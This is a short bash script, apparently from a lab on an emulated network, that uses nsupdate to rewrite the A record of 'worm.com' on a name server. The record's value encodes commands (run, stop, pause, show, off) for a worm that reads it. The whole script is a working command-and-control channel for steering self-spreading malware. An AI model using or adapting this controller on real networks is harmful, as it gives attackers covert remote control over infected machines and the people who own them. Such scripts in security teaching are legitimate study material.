#!/bin/bash

# This is the com name server 
dns_server=10.151.0.53

new_command=$1

case "$1" in
    "run")
	new_command="0.0.0.0"
        ;;

    "stop")
	new_command="1.0.0.0"
        ;;

    "pause")
	new_command="2.0.0.0"
        ;;

    "show")
	new_command="10.0.0.0"
        ;;

    "off")
	new_command="11.0.0.0"
        ;;

    *)
	new_command="0.0.0.0"
        ;;
esac

update_command=$(cat <<EOF
server $dns_server
zone com.
update delete worm.com A
update add worm.com 1 A $new_command
send
EOF
)

printf "$update_command" | nsupdate
